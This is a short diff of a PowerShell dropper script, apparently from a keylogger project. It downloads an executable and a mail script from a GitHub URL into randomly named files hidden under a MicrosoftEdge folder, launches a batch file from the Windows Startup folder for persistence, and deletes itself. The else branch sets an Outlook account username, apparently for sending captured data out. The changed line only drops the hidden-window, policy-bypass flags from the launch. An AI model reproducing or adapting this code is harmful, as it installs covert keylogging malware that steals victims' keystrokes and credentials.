@@ -3,7 +3,7 @@ if (Test-Path "C:\Windows\System32\VCRUNTIME140.DLL") {
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/kk.exe" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\ygoLa8SyqmQTGsoh.exe"
     Invoke-WebRequest -URI "https://raw.githubusercontent.com/MirozoPL/mirozokeylogger/main/psmail.ps1" -OutFile "$env:LOCALAPPDATA\MicrosoftEdge\404eb8b50ea0d5d6\LhFDtKhHgdiXDSt3.ps1"
     #powershell -executionpolicy bypass -File "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
-    powershell -windowstyle hidden -ExecutionPolicy Bypass Start-Process "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
+    Start-Process -FilePath "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\oPNUennj8FXKrOBhUURQ.bat"
     Remove-Item -Path $MyInvocation.MyCommand.Source
 } else {
     $Username = "jankowalski69zs@outlook.com"
